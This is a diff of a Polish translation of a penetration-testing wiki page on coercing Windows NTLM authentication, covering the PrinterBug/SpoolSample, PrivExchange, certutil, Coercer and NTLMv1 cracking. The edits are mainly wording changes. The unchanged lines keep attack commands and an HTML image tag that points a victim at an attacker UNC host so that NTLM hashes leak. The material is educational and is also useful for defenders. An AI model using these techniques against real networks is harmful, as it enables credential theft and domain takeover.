@@ -19,7 +19,7 @@ Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (Operati
 ```
 ### Znajdowanie usług Spooler nasłuchujących
 
-Używając nieco zmodyfikowanego @mysmartlogin'a (Vincent Le Toux) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), sprawdź, czy usługa Spooler nasłuchuje:
+Używając nieco zmodyfikowanego @mysmartlogin (Vincent Le Toux) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), sprawdź, czy usługa Spooler nasłuchuje:
 ```bash
 . .\Get-SpoolStatus.ps1
 ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
@@ -41,17 +41,19 @@ printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
 ```
 ### Łączenie z Nieograniczoną Delegacją
 
-Jeśli atakujący już skompromitował komputer z [Nieograniczoną Delegacją](unconstrained-delegation.md), atakujący mógłby **sprawić, że drukarka uwierzytelni się w tym komputerze**. Z powodu nieograniczonej delegacji, **TGT** **konta komputera drukarki** będzie **zapisane w** **pamięci** komputera z nieograniczoną delegacją. Ponieważ atakujący już skompromitował ten host, będzie w stanie **odzyskać ten bilet** i go nadużyć ([Pass the Ticket](pass-the-ticket.md)).
+Jeśli atakujący już skompromitował komputer z [Nieograniczoną Delegacją](unconstrained-delegation.md), atakujący mógłby **sprawić, że drukarka uwierzytelni się w tym komputerze**. Z powodu nieograniczonej delegacji, **TGT** konta **komputera drukarki** będzie **zapisywane w** **pamięci** komputera z nieograniczoną delegacją. Ponieważ atakujący już skompromitował ten host, będzie w stanie **odzyskać ten bilet** i go nadużyć ([Pass the Ticket](pass-the-ticket.md)).
 
 ## Wymuszenie uwierzytelnienia RCP
 
-{% embed url="https://github.com/p0dalirius/Coercer" %}
+{{#ref}}
+https://github.com/p0dalirius/Coercer
+{{#endref}}
 
 ## PrivExchange
 
-Atak `PrivExchange` jest wynikiem luki znalezionej w **funkcji `PushSubscription` serwera Exchange**. Funkcja ta pozwala serwerowi Exchange na wymuszenie przez dowolnego użytkownika domeny z skrzynką pocztową uwierzytelnienia do dowolnego hosta dostarczonego przez klienta za pośrednictwem HTTP.
+Atak `PrivExchange` jest wynikiem luki znalezionej w funkcji **PushSubscription serwera Exchange**. Ta funkcja pozwala serwerowi Exchange na wymuszenie przez dowolnego użytkownika domeny z skrzynką pocztową uwierzytelnienia do dowolnego hosta dostarczonego przez klienta za pośrednictwem HTTP.
 
-Domyślnie **usługa Exchange działa jako SYSTEM** i ma nadmierne uprawnienia (konkretnie, ma **uprawnienia WriteDacl na domenie przed 2019 rokiem Cumulative Update**). Ta luka może być wykorzystana do umożliwienia **przekazywania informacji do LDAP i następnie wydobycia bazy danych NTDS domeny**. W przypadkach, gdy przekazywanie do LDAP nie jest możliwe, ta luka może być nadal używana do przekazywania i uwierzytelniania do innych hostów w obrębie domeny. Udane wykorzystanie tego ataku zapewnia natychmiastowy dostęp do administratora domeny z dowolnym uwierzytelnionym kontem użytkownika domeny.
+Domyślnie **usługa Exchange działa jako SYSTEM** i ma nadmierne uprawnienia (konkretnie, ma **uprawnienia WriteDacl na domenie przed aktualizacją zbiorczą z 2019 roku**). Ta luka może być wykorzystana do umożliwienia **przekazywania informacji do LDAP i następnie wydobycia bazy danych NTDS domeny**. W przypadkach, gdy przekazywanie do LDAP nie jest możliwe, ta luka może być nadal używana do przekazywania i uwierzytelniania do innych hostów w obrębie domeny. Udane wykorzystanie tego ataku zapewnia natychmiastowy dostęp do administratora domeny z dowolnym uwierzytelnionym kontem użytkownika domeny.
 
 ## Wewnątrz Windows
 
@@ -84,9 +86,9 @@ Możliwe jest użycie certutil.exe lolbin (podpisany przez Microsoft) do wymusze
 ```bash
 certutil.exe -syncwithWU  \\127.0.0.1\share
 ```
-## HTML injection
+## Wstrzykiwanie HTML
 
-### Via email
+### Poprzez e-mail
 
 Jeśli znasz **adres e-mail** użytkownika, który loguje się na maszynie, którą chcesz skompromitować, możesz po prostu wysłać mu **e-mail z obrazem 1x1** takim jak
 ```html
@@ -96,13 +98,13 @@ i gdy to otworzy, spróbuje się uwierzytelnić.
 
 ### MitM
 
-Jeśli możesz przeprowadzić atak MitM na komputer i wstrzyknąć HTML na stronie, którą będzie wizualizować, możesz spróbować wstrzyknąć obrazek taki jak poniższy na stronie:
+Jeśli możesz przeprowadzić atak MitM na komputer i wstrzyknąć HTML na stronie, którą będzie przeglądał, możesz spróbować wstrzyknąć obrazek taki jak poniższy na stronę:
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
 ## Łamanie NTLMv1
 
-Jeśli możesz przechwycić [wyzwania NTLMv1, przeczytaj tutaj, jak je złamać](../ntlm/#ntlmv1-attack).\
-&#xNAN;_&#x52;emember, że aby złamać NTLMv1, musisz ustawić wyzwanie Respondera na "1122334455667788"_
+Jeśli możesz przechwycić [wyzwania NTLMv1 przeczytaj tutaj jak je złamać](../ntlm/#ntlmv1-attack).\
+&#xNAN;_&#x52;emember, że aby złamać NTLMv1 musisz ustawić wyzwanie Respondera na "1122334455667788"_
 
 {{#include ../../banners/hacktricks-training.md}}
